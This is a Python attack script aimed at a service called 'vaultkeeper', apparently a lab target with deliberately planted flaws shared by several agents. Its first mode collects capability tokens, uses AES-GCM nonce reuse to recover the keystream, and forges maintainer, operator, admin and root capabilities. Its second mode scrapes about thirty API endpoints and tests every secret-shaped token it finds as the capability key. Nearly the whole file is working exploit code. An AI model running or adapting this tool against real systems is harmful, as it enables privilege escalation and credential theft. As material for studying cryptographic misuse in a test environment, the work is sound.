#!/usr/bin/env python3
"""
Wire-driver batch for vaultkeeper. Two jobs, both fire-and-forget.

  --caps N      pull N capability samples and run the AES-GCM nonce analysis
                (scope C: is the planted VK_CAP_IV constant actually in use?)
  --harvest     GET/POST every known endpoint once, save every body, then
                offline-test every high-entropy token in the corpus as a
                candidate cap.mask or cap.key (scope D: cap.key is NOT on the
                redaction list, so key-derived material renders in the clear).

Everything after the requests is offline, so the slot is held for the minimum
time. Paced at --delay (default 0.12s) so the other three agents aren't
starved.
"""
import argparse
import base64
import json
import os
import re
import string
import sys
import time

import requests

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import gcm  # noqa: E402

ART = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                   "..", "artifacts", "wire")
ALNUM = set(string.ascii_letters + string.digits)

S = requests.Session()
S.headers["User-Agent"] = "Mozilla/5.0"

GETS = [
    "/api/status.php", "/api/dashboard.php", "/api/metrics.php", "/api/jobs.php",
    "/api/nodes.php", "/api/keys.php", "/api/settings.php", "/api/audit.php",
    "/api/diag.php", "/api/capacity.php", "/api/catalog.php", "/api/plan.php",
    "/api/policies.php", "/api/replication.php", "/api/retention.php",
    "/api/schedules.php", "/api/sessions.php", "/api/snapshots.php",
    "/api/tags.php", "/api/webhooks.php", "/api/alertrules.php",
    "/api/annotations.php", "/api/apitokens.php", "/api/accounts.php",
    "/api/connectors.php", "/api/notifications.php", "/api/bundle_index.php",
    "/api/integrity.php", "/api/replica.php", "/api/service_token.php",
    "/api/session_ticket.php", "/api/audit_search.php",
]


def save(name, text):
    os.makedirs(ART, exist_ok=True)
    with open(os.path.join(ART, name), "w") as f:
        f.write(text)


def get_cap(base, kind, delay):
    try:
        if kind == "viewer":
            r = S.get(base + "/api/status.php", timeout=20)
            return r.json().get("read_capability")
        r = S.post(base + "/api/request_restore.php",
                   json={"source_label": "x"}, timeout=20)
        return r.json().get("cap")
    except Exception as e:
        print("  cap fetch failed (%s): %s" % (kind, e))
        return None
    finally:
        time.sleep(delay)


def do_caps(base, n, delay):
    samples = []
    for i in range(n):
        kind = "viewer" if i % 2 == 0 else "guest"
        c = get_cap(base, kind, delay)
        if c:
            samples.append(("%s/%d" % (kind, i), c))
    save("caps.json", json.dumps(samples, indent=1))
    print("[*] collected %d caps -> artifacts/wire/caps.json" % len(samples))
    if len(samples) < 2:
        return
    groups = gcm.analyse(samples)

    # a reused nonce carrying two DIFFERENT ciphertexts breaks the scheme
    for iv, hits in groups.items():
        cts = {h[1] for h in hits}
        if len(hits) > 1 and len(cts) > 1:
            (l1, c1, t1), (l2, c2, t2) = [h for h in hits if True][:2]
            for a in hits:
                for b in hits:
                    if a[1] != b[1]:
                        (l1, c1, t1), (l2, c2, t2) = a, b
                        break
            h, ej0 = gcm.forbidden(c1, t1, c2, t2)
            pt1 = gcm.pad_scope(l1.split("/")[0])
            ks = bytes(x ^ y for x, y in zip(c1, pt1))
            print("[+] NONCE REUSE EXPLOITED. keystream=%s" % ks.hex())
            for scope in ("maintainer", "operator", "admin", "root"):
                cap = gcm.forge_cap(iv, ks, gcm.pad_scope(scope), h, ej0)
                print("    forged %-11s %s" % (scope, cap))
            save("forged_caps.txt", "\n".join(
                "%s %s" % (s, gcm.forge_cap(iv, ks, gcm.pad_scope(s), h, ej0))
                for s in ("maintainer", "operator", "admin", "root")))
            return
    print("[-] no exploitable nonce reuse in this sample")


TOKEN_RE = re.compile(r"[A-Za-z0-9+/=_-]{12,64}")


def candidates_from(text):
    """Every plausible secret-shaped token in a response body."""
    out = set()
    for m in TOKEN_RE.findall(text):
        out.add(m)
        # 16-char alnum windows are the exact shape of cap.mask / cap.key
        core = "".join(ch for ch in m if ch in ALNUM)
        for i in range(0, max(1, len(core) - 15)):
            w = core[i:i + 16]
            if len(w) == 16:
                out.add(w)
    return out


def do_harvest(base, delay, masked_b64, cap_b64):
    corpus = {}
    for p in GETS:
        try:
            r = S.get(base + p, timeout=20)
            corpus[p] = r.text
        except Exception as e:
            corpus[p] = "ERR %s" % e
        time.sleep(delay)
    save("corpus.json", json.dumps(corpus, indent=1))
    print("[*] harvested %d endpoints -> artifacts/wire/corpus.json" % len(corpus))
    offline_test(corpus, masked_b64, cap_b64)


def offline_test(corpus, masked_b64, cap_b64):
    """Test every token in the corpus as cap.mask or cap.key."""
    if not (masked_b64 and cap_b64):
        print("[*] skipping candidate test (need --masked and --cap)")
        return
    masked = base64.b64decode(masked_b64)
    cands = set()
    for text in corpus.values():
        cands |= candidates_from(text)
    print("[*] %d candidate tokens" % len(cands))
    want = gcm.pad_scope("viewer")
    hits = []
    for c in cands:
        for key in _key_forms(c, masked):
            if gcm.verify_key(cap_b64, key, want):
                hits.append((c, key))
                print("[+] HIT candidate=%r key=%r" % (c, key))
    if not hits:
        print("[-] no candidate token yields the cap key")
    return hits


def _key_forms(tok, masked):
    """A token can be the mask (XOR with masked) or the key itself."""
    forms = []
    b = tok.encode()
    if len(b) == 16:
        forms.append(bytes(x ^ y for x, y in zip(b, masked)))  # tok is the mask
        forms.append(b)                                        # tok is the key
    for h in (32,):
        if len(tok) == h and all(ch in "0123456789abcdefABCDEF" for ch in tok):
            try:
                raw = bytes.fromhex(tok)
                forms.append(raw)
                forms.append(bytes(x ^ y for x, y in zip(raw, masked)))
            except Exception:
                pass
    return forms


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    ap.add_argument("--caps", type=int, default=0)
    ap.add_argument("--harvest", action="store_true")
    ap.add_argument("--delay", type=float, default=0.12)
    ap.add_argument("--masked", default="")
    ap.add_argument("--cap", default="")
    a = ap.parse_args()
    base = a.base.rstrip("/")
    if a.caps:
        do_caps(base, a.caps, a.delay)
    if a.harvest:
        do_harvest(base, a.delay, a.masked, a.cap)


if __name__ == "__main__":
    main()
